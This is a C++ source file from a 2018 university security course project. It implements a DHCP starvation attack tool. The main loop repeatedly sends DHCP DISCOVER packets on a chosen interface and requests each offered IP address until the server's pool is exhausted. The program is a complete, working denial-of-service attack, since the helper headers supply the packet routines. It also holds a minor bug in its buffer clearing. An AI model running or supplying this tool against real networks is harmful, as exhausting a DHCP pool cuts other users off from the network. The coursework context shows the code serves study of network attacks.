/**************************************
*        Project to PDS - 2018        *
*            DHCP attacks             *
*      Michal Gabonay - xgabon00      *
*  Faculty of Information Technology  *
*    University of Technology Brno    *
**************************************/

#include <errno.h>
#include <iostream>
#include <linux/if_ether.h>
#include <netinet/ip.h>
#include <netpacket/packet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#include "dhcp.h"
#include "ethernet.h"
#include "pds-dhcpstarve.h"
#include "socket.h"

/* Sockets. */
static int sock_recv = -1;
static int sock_send = -1;

int exit_application(int return_code) {

  if (sock_recv != -1) {
    close(sock_recv);
    sock_recv = -1;
  }
  if (sock_send != -1) {
    close(sock_send);
    sock_send = -1;
  }
  if (return_code != 0) {
    // printf("Attack ended with error. Exit application.\n");
  } else {
    // printf("Attack ended successful. Exit application.\n");
  }
  exit(return_code);
}

int main(int argc, char *argv[]) {

  char *interface_name;
  unsigned char interface_mac[6]; /* Network interface hardware address. */
  int interface_index = 0;        // Interface number

  if (argc == 3 && (strcmp(argv[1], "-i")) == 0) {
    interface_name = argv[2];
  } else {
    printf("Usage: %s -i <interface>\n", argv[0]);
    return EXIT_SUCCESS;
  }

  sock_send = create_dhcp_send_socket();
  sock_recv = create_dhcp_recv_socket();

  if (-1 == sock_recv || -1 == sock_send)
    exit_application(EXIT_FAILURE);

  if (-1 == (interface_index = get_interface_index(sock_send, interface_name)))
    exit_application(EXIT_FAILURE);

  if (-1 == get_interface_mac(sock_send, interface_name, interface_mac,
                              sizeof(interface_mac)))
    exit_application(EXIT_FAILURE);

  while (1) {

    std::cout.flush();
    sleep(1);
    int result =
        send_discovery_packet(sock_send, interface_mac, interface_index);
    // int result = send_dhcp_packet(sock_send, msg_type);
    if (result < 0) {
      printf("Error: discovery packet can not be send\n");
      return EXIT_FAILURE;
    }
    std::cout.flush();
    sleep(1);

    uint8_t recv_data[BUFFER_SIZE] = {0x00};
    memset(recv_data, 0, sizeof(BUFFER_SIZE));

    int numbytes = 0;
    char ipAddr[16];
    uint32_t server_identifier = 0;
    uint32_t msg_type = 0;
    fd_set rfds;
    struct timeval read_timeout;
    int select_ret;
    dhcp_packet_t *dhcp_offer;

    FD_ZERO(&rfds);
    while (1) {
      FD_SET(sock_recv, &rfds);
      memset(&read_timeout, 0, sizeof(read_timeout));
      read_timeout.tv_sec = 4;

      select_ret = select(sock_recv + 1, &rfds, NULL, NULL, &read_timeout);
      if (select_ret == -1) {
        exit_application(EXIT_FAILURE);
      } else if (select_ret == 0) {
        // printf("DHCP OFFER not recieved, DHCP pool should be empty.\n");
        exit_application(EXIT_SUCCESS);
      } else {
        numbytes = recvfrom(sock_recv, recv_data, BUFFER_SIZE, 0, NULL, NULL);
        if (errno != 0 || numbytes < 0) {
          printf("Error: recvfrom\n");
          exit_application(EXIT_FAILURE);
        }

        dhcp_offer = parse_dhcp_offer(recv_data, &server_identifier);
        if (0 != dhcp_get_option(dhcp_offer, DHCP_OPTION_MESSAGE_TYPE,
                                 &msg_type, sizeof(msg_type), NULL)) {
          // printf("no msg_type option in DHCPOFFER \n");
          msg_type = 0;
        }

        if (msg_type != DHCPOFFER) {
          continue; // ignore receving packet
        }

        snprintf(ipAddr, sizeof ipAddr, "%u.%u.%u.%u",
                 (dhcp_offer->yiaddr & 0x000000ff),
                 (dhcp_offer->yiaddr & 0x0000ff00) >> 8,
                 (dhcp_offer->yiaddr & 0x00ff0000) >> 16,
                 (dhcp_offer->yiaddr & 0xff000000) >> 24);

        printf("taking ip: %s\n", ipAddr);
        break;
      }
    }

    result =
        send_request_packet(sock_send, interface_mac, interface_index,
                            &dhcp_offer->yiaddr, sizeof(dhcp_offer->yiaddr),
                            &server_identifier, sizeof(server_identifier));
    if (result < 0) {
      printf("Error: request packet can not be send\n");
      return EXIT_FAILURE;
    }
  }

  exit_application(EXIT_SUCCESS);

  return EXIT_SUCCESS;
}